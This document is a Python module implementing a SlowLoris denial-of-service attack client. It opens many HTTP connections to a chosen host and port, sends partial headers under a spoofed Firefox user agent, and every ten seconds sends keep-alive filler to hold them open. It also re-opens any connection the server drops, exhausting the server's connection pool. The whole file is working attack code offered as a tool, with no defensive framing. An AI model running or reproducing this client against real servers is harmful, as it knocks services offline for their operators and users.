"""This module implements the SlowLoris client."""

import threading
import time

from .connection import LorisConnection

# Constants
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"

class SlowLoris:
    """SlowLoris attack client."""

    def __init__(self):
        self.connections = []
        self.recreated_connections = 0
        self.keepalive_thread = threading.Thread(target=self.keep_alive)
        self.keepalive_thread.setDaemon(True)
        self.keepalive_thread.start()

    def attack(self, host, port, count):
        """Starts the attack."""
        print("Initializing {} connections.".format(count))
        # Start 'count' connections and send the initial HTTP headers.
        for _ in range(count):
            try:
                conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
                self.connections.insert(0, conn)
            except TimeoutError:
                pass

    def stop(self):
        """Stops the attack."""
        for conn in self.connections:
            conn.close()

    def keep_alive(self):
        """Make sure that connections stay alive once established."""
        while True:
            time.sleep(10)
            connection_count = len(self.connections)
            print("Sending keep-alive headers for {} connections.".format(connection_count))
            # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
            for i in range(0, connection_count):
                try:
                    self.connections[i].keep_alive()
                except KeyboardInterrupt:
                    raise
                # pylint: disable=W0702
                # If the server closed one of our connections,
                # re-open the connection in its place.
                except:
                    threshold = connection_count // 20
                    if self.recreated_connections > threshold:
                        print("Recreated {} connections.".format(self.recreated_connections))
                        self.recreated_connections -= threshold
                    host, port = (self.connections[i].host, self.connections[i].port)
                    try:
                        conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
                        self.connections[i] = conn
                        self.recreated_connections += 1
                    except TimeoutError:
                        pass
